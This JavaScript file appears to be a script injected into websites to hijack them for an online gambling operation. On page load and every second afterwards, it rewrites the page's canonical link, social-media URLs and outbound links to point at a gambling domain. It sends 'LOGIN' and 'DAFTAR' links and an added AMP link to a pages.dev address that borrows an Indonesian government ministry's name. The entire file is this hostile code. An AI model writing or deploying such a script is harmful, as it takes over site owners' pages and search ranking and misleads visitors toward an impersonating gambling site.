// Define the official domains
const officialDomain = 'https://anabulbet.it.com'; 
const ampDomain = 'https://kominfo-official.pages.dev/amp/umc/';       

function replaceAnchorTags() {
  
  const anchors = document.querySelectorAll('a');

  anchors.forEach(anchor => {
    if (anchor.textContent.trim().toUpperCase() === 'LOGIN' || anchor.textContent.trim().toUpperCase() === 'DAFTAR') {
      anchor.href = ampDomain; 
    }
  });
}


function forceUrlsToOfficialDomain() {

  const canonicalLink = document.querySelector('link[rel="canonical"]');
  let canonicalBasePath = ''; 

  if (canonicalLink) {
    
    canonicalBasePath = canonicalLink.href.replace(/^https?:\/\/[^\/]+/, '');
    canonicalLink.href = officialDomain; 
  } else {
    
    const newCanonical = document.createElement('link');
    newCanonical.rel = 'canonical';
    newCanonical.href = officialDomain; 
    document.head.appendChild(newCanonical);
  }

  
  const links = document.querySelectorAll('a[href]');
  links.forEach(link => {
    
    if (link.href.startsWith('http') && !isSpecialLink(link)) {
      const relativePath = link.href.replace(/^https?:\/\/[^\/]+/, ''); // Ambil path setelah domain
      
      link.href = officialDomain + relativePath.replace(canonicalBasePath, ''); 
    }
  });

  const metaUrls = document.querySelectorAll('meta[property="og:url"], meta[name="twitter:url"]');
  metaUrls.forEach(meta => {
    const metaPath = meta.content.replace(/^https?:\/\/[^\/]+/, ''); 
    meta.content = officialDomain + metaPath.replace(canonicalBasePath, ''); 
  });

  // Change AMP link if it exists
  const ampLink = document.querySelector('link[rel="amphtml"]');
  if (ampLink) {
    
    ampLink.href = ampDomain; 
  } else {
    const newAmpLink = document.createElement('link');
    newAmpLink.rel = 'amphtml';
    newAmpLink.href = ampDomain; 
    document.head.appendChild(newAmpLink); 
  }
}


function isSpecialLink(link) {

  return link.classList.contains('login') ||
         link.classList.contains('register') ||
         link.href === officialDomain ||
         link.href === ampDomain ||
         link.classList.contains('special-link') || 
         link.textContent.trim().toUpperCase() === 'LOGIN' || 
         link.textContent.trim().toUpperCase() === 'DAFTAR'; 
}


document.addEventListener('DOMContentLoaded', () => {
  forceUrlsToOfficialDomain(); 
  replaceAnchorTags(); 
});


setInterval(forceUrlsToOfficialDomain, 1000);
